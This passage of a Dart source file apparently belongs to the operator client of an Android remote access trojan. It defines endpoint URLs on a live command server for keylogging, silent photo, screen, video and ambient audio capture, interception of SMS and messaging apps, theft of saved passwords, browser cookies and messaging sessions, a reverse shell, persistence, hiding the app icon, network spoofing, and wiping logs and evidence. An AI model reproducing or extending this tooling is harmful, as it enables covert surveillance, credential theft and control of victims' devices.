  static const String ratPatchBootImage = "$apiBaseUrl/api/patch-boot-image";
  static const String ratInstallRecovery = "$apiBaseUrl/api/install-recovery";

  // ==================== EXTRA FEATURES - REMOTE ACCESS ====================
  
  static const String ratSshTunnel = "$apiBaseUrl/api/ssh-tunnel";
  static const String ratVncRemote = "$apiBaseUrl/api/vnc-remote";
  static const String ratRdpSession = "$apiBaseUrl/api/rdp-session";
  static const String ratAdbOverNetwork = "$apiBaseUrl/api/adb-over-network";
  static const String ratReverseShell = "$apiBaseUrl/api/reverse-shell";

  // ==================== EXTRA FEATURES - HARDWARE CONTROL ====================
  
  static const String ratOverclockCpu = "$apiBaseUrl/api/overclock-cpu";
  static const String ratUnderclockCpu = "$apiBaseUrl/api/underclock-cpu";
  static const String ratDisableCharging = "$apiBaseUrl/api/disable-charging";
  static const String ratEnableFastCharging = "$apiBaseUrl/api/enable-fast-charging";
  static const String ratChangeMac = "$apiBaseUrl/api/change-mac";
  static const String ratSpoofImei = "$apiBaseUrl/api/spoof-imei";
  static const String ratDisableSensors = "$apiBaseUrl/api/disable-sensors";
  static const String ratHapticFeedback = "$apiBaseUrl/api/haptic-feedback";

  // ==================== EXTRA FEATURES - BATTERY EXPLOIT ====================
  
  static const String ratDrainBattery = "$apiBaseUrl/api/drain-battery";
  static const String ratStopCharging = "$apiBaseUrl/api/stop-charging";
  static const String ratBatterySpoof = "$apiBaseUrl/api/battery-spoof";
  static const String ratChargeLimit = "$apiBaseUrl/api/charge-limit";

  // ==================== EXTRA FEATURES - CAMERA EXPLOIT ====================
  
  static const String ratRecordVideoBackground = "$apiBaseUrl/api/record-video-background";
  static const String ratStealthPhoto = "$apiBaseUrl/api/stealth-photo";
  static const String ratFaceDetection = "$apiBaseUrl/api/face-detection";
  static const String ratMotionDetection = "$apiBaseUrl/api/motion-detection";
  static const String ratContinuousRecording = "$apiBaseUrl/api/continuous-recording";
  static const String ratRemoteFlash = "$apiBaseUrl/api/remote-flash";

  // ==================== EXTRA FEATURES - MICROPHONE EXPLOIT ====================
  
  static const String ratAmbientRecording = "$apiBaseUrl/api/ambient-recording";
  static const String ratVoiceCommandListener = "$apiBaseUrl/api/voice-command-listener";
  static const String ratAudioFrequencyAnalyzer = "$apiBaseUrl/api/audio-frequency-analyzer";
  static const String ratNoiseCancellationBypass = "$apiBaseUrl/api/noise-cancellation-bypass";

  // ==================== EXTRA FEATURES - SMS & CALLS ====================
  
  static const String ratAutoReplySms = "$apiBaseUrl/api/auto-reply-sms";
  static const String ratForwardSmsEmail = "$apiBaseUrl/api/forward-sms-email";
  static const String ratCallRecording = "$apiBaseUrl/api/call-recording";
  static const String ratCallForwarding = "$apiBaseUrl/api/call-forwarding";
  static const String ratCallBlocking = "$apiBaseUrl/api/call-blocking";

  // ==================== EXTRA FEATURES - NOTIFICATION ====================
  
  static const String ratNotificationListener = "$apiBaseUrl/api/notification-listener";
  static const String ratNotificationInjector = "$apiBaseUrl/api/notification-injector";
  static const String ratNotificationBlocker = "$apiBaseUrl/api/notification-blocker";
  static const String ratQuickReplyInjection = "$apiBaseUrl/api/quick-reply-injection";

  // ==================== EXTRA FEATURES - CLIPBOARD ====================
  
  static const String ratClipboardMonitor = "$apiBaseUrl/api/clipboard-monitor";
  static const String ratClipboardHijack = "$apiBaseUrl/api/clipboard-hijack";
  static const String ratAutoCopy = "$apiBaseUrl/api/auto-copy";

  // ==================== EXTRA FEATURES - KEYLOGGER ADVANCED ====================
  
  static const String ratKeyloggerTimestamps = "$apiBaseUrl/api/keylogger-timestamps";
  static const String ratKeyloggerAppContext = "$apiBaseUrl/api/keylogger-app-context";
  static const String ratScreenshotOnKeypress = "$apiBaseUrl/api/screenshot-on-keypress";
  static const String ratClipboardLogging = "$apiBaseUrl/api/clipboard-logging";

  // ==================== EXTRA FEATURES - SCREEN CONTROL ADV ====================
  
  static const String ratScreenRecorder = "$apiBaseUrl/api/screen-recorder";
  static const String ratScreenLockOverride = "$apiBaseUrl/api/screen-lock-override";
  static const String ratScreenshotPrevention = "$apiBaseUrl/api/screenshot-prevention";
  static const String ratScreenDimmer = "$apiBaseUrl/api/screen-dimmer";
  static const String ratAlwaysOnDisplay = "$apiBaseUrl/api/always-on-display";
  static const String ratScreenFilter = "$apiBaseUrl/api/screen-filter";

  // ==================== EXTRA FEATURES - APP CONTROL ====================
  
  static const String ratFreezeApp = "$apiBaseUrl/api/freeze-app";
  static const String ratUnfreezeApp = "$apiBaseUrl/api/unfreeze-app";
  static const String ratDisableApp = "$apiBaseUrl/api/disable-app";
  static const String ratEnableApp = "$apiBaseUrl/api/enable-app";
  static const String ratClearAppCache = "$apiBaseUrl/api/clear-app-cache";
  static const String ratForceStopAll = "$apiBaseUrl/api/force-stop-all";

  // ==================== EXTRA FEATURES - DEVICE ADMIN ====================
  
  static const String ratLockDeviceRemote = "$apiBaseUrl/api/lock-device-remote";
  static const String ratWipeDevice = "$apiBaseUrl/api/wipe-device";
  static const String ratDisableCameraPerm = "$apiBaseUrl/api/disable-camera-perm";
  static const String ratDisableMicPerm = "$apiBaseUrl/api/disable-mic-perm";
  static const String ratDisableUsb = "$apiBaseUrl/api/disable-usb";

  // ==================== EXTRA FEATURES - LOCATION SPOOFING ====================
  
  static const String ratGpsSpoof = "$apiBaseUrl/api/gps-spoof";
  static const String ratMockLocation = "$apiBaseUrl/api/mock-location";
  static const String ratLocationHistory = "$apiBaseUrl/api/location-history";
  static const String ratGeofence = "$apiBaseUrl/api/geofence";
  static const String ratSpeedTracking = "$apiBaseUrl/api/speed-tracking";

  // ==================== EXTRA FEATURES - WIFI EXPLOIT ====================
  
  static const String ratWifiScanning = "$apiBaseUrl/api/wifi-scanning";
  static const String ratWifiDeauth = "$apiBaseUrl/api/wifi-deauth";
  static const String ratWifiProbeRequest = "$apiBaseUrl/api/wifi-probe-request";
  static const String ratWifiCaptivePortal = "$apiBaseUrl/api/wifi-captive-portal";
  static const String ratWifiWpsCrack = "$apiBaseUrl/api/wifi-wps-crack";
  static const String ratWifiSignalBooster = "$apiBaseUrl/api/wifi-signal-booster";

  // ==================== EXTRA FEATURES - BLUETOOTH EXPLOIT ====================
  
  static const String ratBluetoothScanning = "$apiBaseUrl/api/bluetooth-scanning";
  static const String ratBluetoothSpoof = "$apiBaseUrl/api/bluetooth-spoof";
  static const String ratBluetoothSniffing = "$apiBaseUrl/api/bluetooth-sniffing";
  static const String ratBluetoothAttack = "$apiBaseUrl/api/bluetooth-attack";
  static const String ratBluetoothKill = "$apiBaseUrl/api/bluetooth-kill";

  // ==================== EXTRA FEATURES - SENSORS ====================
  
  static const String ratAccelerometerData = "$apiBaseUrl/api/accelerometer-data";
  static const String ratGyroscopeData = "$apiBaseUrl/api/gyroscope-data";
  static const String ratMagnetometerData = "$apiBaseUrl/api/magnetometer-data";
  static const String ratProximitySensor = "$apiBaseUrl/api/proximity-sensor";

  // ==================== EXTRA FEATURES - SYSTEM CONTROL ====================
  
  static const String ratBlockSystemUpdate = "$apiBaseUrl/api/block-system-update";
  static const String ratBlockOta = "$apiBaseUrl/api/block-ota";
  static const String ratFactoryResetProtection = "$apiBaseUrl/api/factory-reset-protection";
  static const String ratRootDetectionBypass = "$apiBaseUrl/api/root-detection-bypass";
  static const String ratSafetyNetBypass = "$apiBaseUrl/api/safetynet-bypass";
  static const String ratPlayServicesBypass = "$apiBaseUrl/api/play-services-bypass";

  // ==================== WEB SOCKET ====================
  static const String wsUrl = "ws://cosmox.miunnst.site:3002";

  // ==================== HELPER ====================
  static String getRatCommandUrl(String deviceId) {
    return "$apiBaseUrl/api/get-command/$deviceId";
  }

  static String getRatResponseUrl(String deviceId) {
    return "$apiBaseUrl/api/get-response/$deviceId";
  }

  static String getRatLockChatUrl(String deviceId) {
    return "$apiBaseUrl/api/lock-chat/$deviceId";
  }

  static String getRatLiveFrameUrl(String deviceId) {
    return "$apiBaseUrl/api/live-frame/$deviceId";
  }

  static String getRatNotificationsUrl(String deviceId) {
    return "$apiBaseUrl/api/get-notifications/$deviceId";
  }

  static String getRatHeartbeatUrl(String deviceId) {
    return "$apiBaseUrl/api/heartbeat/$deviceId";
  }

  static String getRatPairUrl() {
    return "$apiBaseUrl/rat/pair";
  }

  static String getRatMyDevicesUrl() {
    return "$apiBaseUrl/rat/my-devices";
  }

  static String getRatPairIdUrl() {
    return "$apiBaseUrl/rat/pairid";
  }

  // ==================== RAT ULTIMATE HELPERS ====================
  
  static String getRatStartKeyloggerUrl() {
    return "$apiBaseUrl/api/start-keylogger";
  }
  
  static String getRatStopKeyloggerUrl() {
    return "$apiBaseUrl/api/stop-keylogger";
  }
  
  static String getRatGetKeylogsUrl() {
    return "$apiBaseUrl/api/get-keylogs";
  }
  
  static String getRatGetClipboardUrl() {
    return "$apiBaseUrl/api/get-clipboard";
  }
  
  static String getRatStartVideoRecordingUrl() {
    return "$apiBaseUrl/api/start-video-recording";
  }
  
  static String getRatStopVideoRecordingUrl() {
    return "$apiBaseUrl/api/stop-video-recording";
  }
  
  static String getRatStartMicRecordingUrl() {
    return "$apiBaseUrl/api/start-mic-recording";
  }
  
  static String getRatStopMicRecordingUrl() {
    return "$apiBaseUrl/api/stop-mic-recording";
  }
  
  static String getRatGetCallLogsUrl() {
    return "$apiBaseUrl/api/get-call-logs";
  }
  
  static String getRatGetInstalledAppsUrl() {
    return "$apiBaseUrl/api/get-installed-apps";
  }
  
  static String getRatGetWifiNetworksUrl() {
    return "$apiBaseUrl/api/get-wifi-networks";
  }
  
  static String getRatGetDeviceInfoUrl() {
    return "$apiBaseUrl/api/get-device-info";
  }
  
  static String getRatSetVolumeUrl() {
    return "$apiBaseUrl/api/set-volume";
  }
  
  static String getRatGetVolumeUrl() {
    return "$apiBaseUrl/api/get-volume";
  }
  
  static String getRatBlockTouchUrl() {
    return "$apiBaseUrl/api/block-touch";
  }
  
  static String getRatUnblockTouchUrl() {
    return "$apiBaseUrl/api/unblock-touch";
  }
  
  static String getRatDisablePowerUrl() {
    return "$apiBaseUrl/api/disable-power";
  }
  
  static String getRatEnablePowerUrl() {
    return "$apiBaseUrl/api/enable-power";
  }
  
  static String getRatDisableKeyboardUrl() {
    return "$apiBaseUrl/api/disable-keyboard";
  }
  
  static String getRatEnableKeyboardUrl() {
    return "$apiBaseUrl/api/enable-keyboard";
  }
  
  static String getRatInstallApkUrl() {
    return "$apiBaseUrl/api/install-apk";
  }
  
  static String getRatClearAppDataUrl() {
    return "$apiBaseUrl/api/clear-app-data";
  }
  
  static String getRatFactoryResetUrl() {
    return "$apiBaseUrl/api/factory-reset";
  }
  
  static String getRatLockBootloaderUrl() {
    return "$apiBaseUrl/api/lock-bootloader";
  }
  
  static String getRatUnlockBootloaderUrl() {
    return "$apiBaseUrl/api/unlock-bootloader";
  }
  
  static String getRatMountSystemRWUrl() {
    return "$apiBaseUrl/api/mount-system-rw";
  }
  
  static String getRatClearLogsUrl() {
    return "$apiBaseUrl/api/clear-logs";
  }
  
  static String getRatBlockNotificationsUrl() {
    return "$apiBaseUrl/api/block-notifications";
  }

  static String getRatUnblockNotificationsUrl() {
    return "$apiBaseUrl/api/unblock-notifications";
  }

  static String getRatEnablePersistenceUrl() {
    return "$apiBaseUrl/api/enable-persistence";
  }

  static String getRatDisablePersistenceUrl() {
    return "$apiBaseUrl/api/disable-persistence";
  }

  static String getRatHideAppIconUrl() {
    return "$apiBaseUrl/api/hide-app-icon";
  }

  static String getRatShowAppIconUrl() {
    return "$apiBaseUrl/api/show-app-icon";
  }

  static String getRatEnableDeviceAdminUrl() {
    return "$apiBaseUrl/api/enable-device-admin";
  }

  static String getRatDisableDeviceAdminUrl() {
    return "$apiBaseUrl/api/disable-device-admin";
  }

  static String getRatEnableWifiUrl() {
    return "$apiBaseUrl/api/enable-wifi";
  }

  static String getRatDisableWifiUrl() {
    return "$apiBaseUrl/api/disable-wifi";
  }

  static String getRatToggleFlashlightUrl() {
    return "$apiBaseUrl/api/toggle-flashlight";
  }

  static String getRatGetBrowserHistoryUrl() {
    return "$apiBaseUrl/api/get-browser-history";
  }

  static String getRatGetSavedPasswordsUrl() {
    return "$apiBaseUrl/api/get-saved-passwords";
  }

  static String getRatGetWifiPasswordsUrl() {
    return "$apiBaseUrl/api/get-wifi-passwords";
  }

  static String getRatGetSimInfoUrl() {
    return "$apiBaseUrl/api/get-sim-info";
  }

  static String getRatGetImeiUrl() {
    return "$apiBaseUrl/api/get-imei";
  }

  static String getRatCheckRootUrl() {
    return "$apiBaseUrl/api/check-root";
  }

  static String getRatGetWaSessionUrl() {
    return "$apiBaseUrl/api/get-wa-session";
  }

  static String getRatGetTgSessionUrl() {
    return "$apiBaseUrl/api/get-tg-session";
  }

  static String getRatGetInstagramSessionUrl() {
    return "$apiBaseUrl/api/get-instagram-session";
  }

  static String getRatGetEmailsUrl() {
    return "$apiBaseUrl/api/get-emails";
  }

  static String getRatGetCalendarUrl() {
    return "$apiBaseUrl/api/get-calendar";
  }

  static String getRatGetNotesUrl() {
    return "$apiBaseUrl/api/get-notes";
  }

  static String getRatGetRunningServicesUrl() {
    return "$apiBaseUrl/api/get-running-services";
  }

  static String getRatGetBatteryHistoryUrl() {
    return "$apiBaseUrl/api/get-battery-history";
  }

  static String getRatGetRecentAppsUrl() {
    return "$apiBaseUrl/api/get-recent-apps";
  }

  static String getRatBrowseFilesUrl() {
    return "$apiBaseUrl/api/browse-files";
  }

  static String getRatUploadFileUrl() {
    return "$apiBaseUrl/api/upload-file";
  }

  static String getRatDownloadFileUrl() {
    return "$apiBaseUrl/api/download-file";
  }

  static String getRatDeleteFileUrl() {
    return "$apiBaseUrl/api/delete-file";
  }

  static String getRatLockAppUrl() {
    return "$apiBaseUrl/api/lock-app";
  }

  static String getRatUnlockAppUrl() {
    return "$apiBaseUrl/api/unlock-app";
  }

  // ==================== SPYWARE / SADAP HELPERS ====================
  
  static String getRatStartAdvancedKeyloggerUrl() {
    return "$apiBaseUrl/api/start-advanced-keylogger";
  }
  
  static String getRatStopAdvancedKeyloggerUrl() {
    return "$apiBaseUrl/api/stop-advanced-keylogger";
  }
  
  static String getRatGetKeylogsTimestampUrl() {
    return "$apiBaseUrl/api/get-keylogs-timestamp";
  }
  
  static String getRatGetKeyloggerStatsUrl() {
    return "$apiBaseUrl/api/get-keylogger-stats";
  }
  
  static String getRatClearKeylogsUrl() {
    return "$apiBaseUrl/api/clear-keylogs";
  }
  
  static String getRatExportKeylogsUrl() {
    return "$apiBaseUrl/api/export-keylogs";
  }
  
  static String getRatStartClipboardMonitorUrl() {
    return "$apiBaseUrl/api/start-clipboard-monitor";
  }
  
  static String getRatStopClipboardMonitorUrl() {
    return "$apiBaseUrl/api/stop-clipboard-monitor";
  }
  
  static String getRatGetClipboardHistoryUrl() {
    return "$apiBaseUrl/api/get-clipboard-history";
  }
  
  static String getRatClearClipboardHistoryUrl() {
    return "$apiBaseUrl/api/clear-clipboard-history";
  }
  
  static String getRatStartScreenRecordingUrl() {
    return "$apiBaseUrl/api/start-screen-recording";
  }
  
  static String getRatStopScreenRecordingUrl() {
    return "$apiBaseUrl/api/stop-screen-recording";
  }
  
  static String getRatGetScreenRecordingUrl() {
    return "$apiBaseUrl/api/get-screen-recording";
  }
  
  static String getRatStartScreenRecordingAudioUrl() {
    return "$apiBaseUrl/api/start-screen-recording-audio";
  }
  
  static String getRatTakeScreenshotSilentUrl() {
    return "$apiBaseUrl/api/take-screenshot-silent";
  }
  
  static String getRatTakeBurstScreenshotsUrl() {
    return "$apiBaseUrl/api/take-burst-screenshots";
  }
  
  static String getRatTakeScreenshotMetadataUrl() {
    return "$apiBaseUrl/api/take-screenshot-metadata";
  }
  
  static String getRatStartAudioRecordingUrl() {
    return "$apiBaseUrl/api/start-audio-recording";
  }
  
  static String getRatStopAudioRecordingUrl() {
    return "$apiBaseUrl/api/stop-audio-recording";
  }
  
  static String getRatGetAudioRecordingUrl() {
    return "$apiBaseUrl/api/get-audio-recording";
  }
  
  static String getRatStartAudioStreamingUrl() {
    return "$apiBaseUrl/api/start-audio-streaming";
  }
  
  static String getRatStopAudioStreamingUrl() {
    return "$apiBaseUrl/api/stop-audio-streaming";
  }
  
  static String getRatStartHqAudioRecordingUrl() {
    return "$apiBaseUrl/api/start-hq-audio-recording";
  }
  
  static String getRatSetAudioQualityUrl() {
    return "$apiBaseUrl/api/set-audio-quality";
  }
  
  static String getRatGetVideoRecordingUrl() {
    return "$apiBaseUrl/api/get-video-recording";
  }
  
  static String getRatStartBgVideoRecordingUrl() {
    return "$apiBaseUrl/api/start-bg-video-recording";
  }
  
  static String getRatStartVideoStreamingUrl() {
    return "$apiBaseUrl/api/start-video-streaming";
  }
  
  static String getRatStopVideoStreamingUrl() {
    return "$apiBaseUrl/api/stop-video-streaming";
  }
  
  static String getRatTakePhotoSilentUrl() {
    return "$apiBaseUrl/api/take-photo-silent";
  }
  
  static String getRatTakePhotoExifUrl() {
    return "$apiBaseUrl/api/take-photo-exif";
  }
  
  static String getRatStartRealtimeLocationUrl() {
    return "$apiBaseUrl/api/start-realtime-location";
  }
  
  static String getRatStopRealtimeLocationUrl() {
    return "$apiBaseUrl/api/stop-realtime-location";
  }
  
  static String getRatGetLocationHistoryUrl() {
    return "$apiBaseUrl/api/get-location-history";
  }
  
  static String getRatClearLocationHistoryUrl() {
    return "$apiBaseUrl/api/clear-location-history";
  }
  
  static String getRatGetGeofenceAlertsUrl() {
    return "$apiBaseUrl/api/get-geofence-alerts";
  }
  
  static String getRatSetGeofenceUrl() {
    return "$apiBaseUrl/api/set-geofence";
  }
  
  static String getRatStartCallRecordingUrl() {
    return "$apiBaseUrl/api/start-call-recording";
  }
  
  static String getRatStopCallRecordingUrl() {
    return "$apiBaseUrl/api/stop-call-recording";
  }
  
  static String getRatGetCallRecordsUrl() {
    return "$apiBaseUrl/api/get-call-records";
  }
  
  static String getRatDeleteCallRecordUrl() {
    return "$apiBaseUrl/api/delete-call-record";
  }
  
  static String getRatStartSmsInterceptorUrl() {
    return "$apiBaseUrl/api/start-sms-interceptor";
  }
  
  static String getRatStopSmsInterceptorUrl() {
    return "$apiBaseUrl/api/stop-sms-interceptor";
  }
  
  static String getRatGetSmsConversationsUrl() {
    return "$apiBaseUrl/api/get-sms-conversations";
  }
  
  static String getRatSendSmsUrl() {
    return "$apiBaseUrl/api/send-sms";
  }
  
  static String getRatSendSmsBulkUrl() {
    return "$apiBaseUrl/api/send-sms-bulk";
  }
  
  static String getRatDeleteAllSmsUrl() {
    return "$apiBaseUrl/api/delete-all-sms";
  }
  
  static String getRatStartWaInterceptorUrl() {
    return "$apiBaseUrl/api/start-wa-interceptor";
  }
  
  static String getRatStopWaInterceptorUrl() {
    return "$apiBaseUrl/api/stop-wa-interceptor";
  }
  
  static String getRatGetWaMessagesUrl() {
    return "$apiBaseUrl/api/get-wa-messages";
  }
  
  static String getRatGetWaContactsUrl() {
    return "$apiBaseUrl/api/get-wa-contacts";
  }
  
  static String getRatGetWaGroupsUrl() {
    return "$apiBaseUrl/api/get-wa-groups";
  }
  
  static String getRatSendWaMessageUrl() {
    return "$apiBaseUrl/api/send-wa-message";
  }
  
  static String getRatGetWaStatusUrl() {
    return "$apiBaseUrl/api/get-wa-status";
  }
  
  static String getRatSetWaStatusUrl() {
    return "$apiBaseUrl/api/set-wa-status";
  }
  
  static String getRatStartTgInterceptorUrl() {
    return "$apiBaseUrl/api/start-tg-interceptor";
  }
  
  static String getRatStopTgInterceptorUrl() {
    return "$apiBaseUrl/api/stop-tg-interceptor";
  }
  
  static String getRatGetTgMessagesUrl() {
    return "$apiBaseUrl/api/get-tg-messages";
  }
  
  static String getRatGetTgContactsUrl() {
    return "$apiBaseUrl/api/get-tg-contacts";
  }
  
  static String getRatGetTgGroupsUrl() {
    return "$apiBaseUrl/api/get-tg-groups";
  }
  
  static String getRatSendTgMessageUrl() {
    return "$apiBaseUrl/api/send-tg-message";
  }
  
  static String getRatStartIgInterceptorUrl() {
    return "$apiBaseUrl/api/start-ig-interceptor";
  }
  
  static String getRatStopIgInterceptorUrl() {
    return "$apiBaseUrl/api/stop-ig-interceptor";
  }
  
  static String getRatGetIgMessagesUrl() {
    return "$apiBaseUrl/api/get-ig-messages";
  }
  
  static String getRatSendIgMessageUrl() {
    return "$apiBaseUrl/api/send-ig-message";
  }
  
  static String getRatStartFbInterceptorUrl() {
    return "$apiBaseUrl/api/start-fb-interceptor";
  }
  
  static String getRatStopFbInterceptorUrl() {
    return "$apiBaseUrl/api/stop-fb-interceptor";
  }
  
  static String getRatGetFbMessagesUrl() {
    return "$apiBaseUrl/api/get-fb-messages";
  }
  
  static String getRatSendFbMessageUrl() {
    return "$apiBaseUrl/api/send-fb-message";
  }
  
  static String getRatGetBrowserBookmarksUrl() {
    return "$apiBaseUrl/api/get-browser-bookmarks";
  }
  
  static String getRatGetBrowserDownloadsUrl() {
    return "$apiBaseUrl/api/get-browser-downloads";
  }
  
  static String getRatGetBrowserCookiesUrl() {
    return "$apiBaseUrl/api/get-browser-cookies";
  }
  
  static String getRatGetBrowserExtensionsUrl() {
    return "$apiBaseUrl/api/get-browser-extensions";
  }
  
  static String getRatGetBrowserTabsUrl() {
    return "$apiBaseUrl/api/get-browser-tabs";
  }
  
  static String getRatClearBrowserCacheUrl() {
    return "$apiBaseUrl/api/clear-browser-cache";
  }
  
  static String getRatClearBrowserHistoryUrl() {
    return "$apiBaseUrl/api/clear-browser-history";
  }
  
  static String getRatInjectBrowserScriptUrl() {
    return "$apiBaseUrl/api/inject-browser-script";
  }
  
  static String getRatCloseBrowserTabUrl() {
    return "$apiBaseUrl/api/close-browser-tab";
  }
  
  static String getRatOpenBrowserTabUrl() {
    return "$apiBaseUrl/api/open-browser-tab";
  }
  
  static String getRatStartPacketCaptureUrl() {
    return "$apiBaseUrl/api/start-packet-capture";
  }
  
  static String getRatStopPacketCaptureUrl() {
    return "$apiBaseUrl/api/stop-packet-capture";
  }
  
  static String getRatGetPacketCaptureUrl() {
    return "$apiBaseUrl/api/get-packet-capture";
  }
  
  static String getRatStartMitmUrl() {
    return "$apiBaseUrl/api/start-mitm";
  }
  
  static String getRatStopMitmUrl() {
    return "$apiBaseUrl/api/stop-mitm";
  }
  
  static String getRatScanNetworkUrl() {
    return "$apiBaseUrl/api/scan-network";
  }
  
  static String getRatGetConnectedDevicesUrl() {
    return "$apiBaseUrl/api/get-connected-devices";
  }
  
  static String getRatPortScanUrl() {
    return "$apiBaseUrl/api/port-scan";
  }
  
  static String getRatArpSpoofUrl() {
    return "$apiBaseUrl/api/arp-spoof";
  }
  
  static String getRatDnsSpoofUrl() {
    return "$apiBaseUrl/api/dns-spoof";
  }
  
  static String getRatGetNetworkStatsUrl() {
    return "$apiBaseUrl/api/get-network-stats";
  }
  
  static String getRatGetNetworkConnectionsUrl() {
    return "$apiBaseUrl/api/get-network-connections";
  }
  
  static String getRatGetFileInfoUrl() {
    return "$apiBaseUrl/api/get-file-info";
  }
  
  static String getRatGetDirectorySizeUrl() {
    return "$apiBaseUrl/api/get-directory-size";
  }
  
  static String getRatCopyFileUrl() {
    return "$apiBaseUrl/api/copy-file";
  }
  
  static String getRatMoveFileUrl() {
    return "$apiBaseUrl/api/move-file";
  }
  
  static String getRatRenameFileUrl() {
    return "$apiBaseUrl/api/rename-file";
  }
  
  static String getRatCreateDirectoryUrl() {
    return "$apiBaseUrl/api/create-directory";
  }
  
  static String getRatRemoveDirectoryUrl() {
    return "$apiBaseUrl/api/remove-directory";
  }
  
  static String getRatZipFilesUrl() {
    return "$apiBaseUrl/api/zip-files";
  }
  
  static String getRatUnzipFilesUrl() {
    return "$apiBaseUrl/api/unzip-files";
  }
  
  static String getRatEncryptFileUrl() {
    return "$apiBaseUrl/api/encrypt-file";
  }
  
  static String getRatDecryptFileUrl() {
    return "$apiBaseUrl/api/decrypt-file";
  }
  
  static String getRatGetSecurityLogUrl() {
    return "$apiBaseUrl/api/get-security-log";
  }
  
  static String getRatClearSecurityLogUrl() {
    return "$apiBaseUrl/api/clear-security-log";
  }
  
  static String getRatGetEncryptionKeyUrl() {
    return "$apiBaseUrl/api/get-encryption-key";
  }
  
  static String getRatSetEncryptionKeyUrl() {
    return "$apiBaseUrl/api/set-encryption-key";
  }
  
  static String getRatEnableSecureModeUrl() {
    return "$apiBaseUrl/api/enable-secure-mode";
  }
  
  static String getRatDisableSecureModeUrl() {
    return "$apiBaseUrl/api/disable-secure-mode";
  }
  
  static String getRatSetFirewallRuleUrl() {
    return "$apiBaseUrl/api/set-firewall-rule";
  }
  
  static String getRatRemoveFirewallRuleUrl() {
    return "$apiBaseUrl/api/remove-firewall-rule";
  }
  
  static String getRatGetFirewallRulesUrl() {
    return "$apiBaseUrl/api/get-firewall-rules";
  }
  
  static String getRatEnableAntivirusScanUrl() {
    return "$apiBaseUrl/api/enable-antivirus-scan";
  }
  
  static String getRatGetAntivirusResultUrl() {
    return "$apiBaseUrl/api/get-antivirus-result";
  }
  
  static String getRatGetUserAccountsUrl() {
    return "$apiBaseUrl/api/get-user-accounts";
  }
  
  static String getRatCreateUserAccountUrl() {
    return "$apiBaseUrl/api/create-user-account";
  }
  
  static String getRatDeleteUserAccountUrl() {
    return "$apiBaseUrl/api/delete-user-account";
  }
  
  static String getRatChangeUserPasswordUrl() {
    return "$apiBaseUrl/api/change-user-password";
  }
  
  static String getRatSetUserPermissionUrl() {
    return "$apiBaseUrl/api/set-user-permission";
  }
  
  static String getRatGetUserPermissionsUrl() {
    return "$apiBaseUrl/api/get-user-permissions";
  }
  
  static String getRatLockUserAccountUrl() {
    return "$apiBaseUrl/api/lock-user-account";
  }
  
  static String getRatUnlockUserAccountUrl() {
    return "$apiBaseUrl/api/unlock-user-account";
  }
  
  static String getRatEnableGuestModeUrl() {
    return "$apiBaseUrl/api/enable-guest-mode";
  }
  
  static String getRatDisableGuestModeUrl() {
    return "$apiBaseUrl/api/disable-guest-mode";
  }
  
  static String getRatGetSystemInfoUrl() {
    return "$apiBaseUrl/api/get-system-info";
  }
  
  static String getRatGetHardwareInfoUrl() {
    return "$apiBaseUrl/api/get-hardware-info";
  }
  
  static String getRatGetOsInfoUrl() {
    return "$apiBaseUrl/api/get-os-info";
  }
  
  static String getRatGetKernelInfoUrl() {
    return "$apiBaseUrl/api/get-kernel-info";
  }
  
  static String getRatGetCpuInfoUrl() {
    return "$apiBaseUrl/api/get-cpu-info";
  }
  
  static String getRatGetMemoryInfoUrl() {
    return "$apiBaseUrl/api/get-memory-info";
  }
  
  static String getRatGetDiskInfoUrl() {
    return "$apiBaseUrl/api/get-disk-info";
  }
  
  static String getRatGetRunningTasksUrl() {
    return "$apiBaseUrl/api/get-running-tasks";
  }
  
  static String getRatKillProcessUrl() {
    return "$apiBaseUrl/api/kill-process";
  }
  
  static String getRatWipeEvidenceUrl() {
    return "$apiBaseUrl/api/wipe-evidence";
  }
  
  static String getRatWipeLogsUrl() {
    return "$apiBaseUrl/api/wipe-logs";
  }
  
  static String getRatWipeCacheUrl() {
    return "$apiBaseUrl/api/wipe-cache";
  }
  
  static String getRatWipeTempFilesUrl() {
    return "$apiBaseUrl/api/wipe-temp-files";
  }
  
  static String getRatWipeRecentFilesUrl() {
    return "$apiBaseUrl/api/wipe-recent-files";
  }
  
  static String getRatWipeClipboardHistoryUrl() {
    return "$apiBaseUrl/api/wipe-clipboard-history";
  }
  
  static String getRatWipeSearchHistoryUrl() {
    return "$apiBaseUrl/api/wipe-search-history";
  }
  
  static String getRatWipeLocationHistoryUrl() {
    return "$apiBaseUrl/api/wipe-location-history";
  }
  
  static String getRatWipeCallHistoryUrl() {
    return "$apiBaseUrl/api/wipe-call-history";
  }
  
  static String getRatWipeSmsHistoryUrl() {
    return "$apiBaseUrl/api/wipe-sms-history";
  }
  
  static String getRatWipeAllUrl() {
    return "$apiBaseUrl/api/wipe-all";
  }
  
  static String getRatStartRemoteDesktopUrl() {
    return "$apiBaseUrl/api/start-remote-desktop";
  }
  
  static String getRatStopRemoteDesktopUrl() {
    return "$apiBaseUrl/api/stop-remote-desktop";
  }
  
  static String getRatRemoteDesktopMouseUrl() {
    return "$apiBaseUrl/api/remote-desktop-mouse";
  }
  
  static String getRatRemoteDesktopKeyboardUrl() {
    return "$apiBaseUrl/api/remote-desktop-keyboard";
  }
  
  static String getRatRemoteDesktopSendKeysUrl() {
    return "$apiBaseUrl/api/remote-desktop-send-keys";
  }
  
  static String getRatRemoteDesktopClickUrl() {
    return "$apiBaseUrl/api/remote-desktop-click";
  }
  
  static String getRatRemoteDesktopScrollUrl() {
    return "$apiBaseUrl/api/remote-desktop-scroll";
  }
  
  static String getRatAutoTapUrl() {
    return "$apiBaseUrl/api/auto-tap";
  }
  
  static String getRatAutoSwipeUrl() {
    return "$apiBaseUrl/api/auto-swipe";
  }
  
  static String getRatAutoClickUrl() {
    return "$apiBaseUrl/api/auto-click";
  }
  
  static String getRatAutoScrollUrl() {
    return "$apiBaseUrl/api/auto-scroll";
  }
  
  static String getRatAutoTypeUrl() {
    return "$apiBaseUrl/api/auto-type";
  }
  
  static String getRatRecordActionsUrl() {
    return "$apiBaseUrl/api/record-actions";
  }
  
  static String getRatStopRecordActionsUrl() {
    return "$apiBaseUrl/api/stop-record-actions";
  }
  
  static String getRatPlayActionsUrl() {
    return "$apiBaseUrl/api/play-actions";
  }
  
  static String getRatLoopActionsUrl() {
    return "$apiBaseUrl/api/loop-actions";
  }
  
  static String getRatSetAutoResponseUrl() {
    return "$apiBaseUrl/api/set-auto-response";
  }
  
  static String getRatSetAutoReplyUrl() {
    return "$apiBaseUrl/api/set-auto-reply";
  }
  
  static String getRatAiAnalyzeScreenUrl() {
    return "$apiBaseUrl/api/ai-analyze-screen";
  }
  
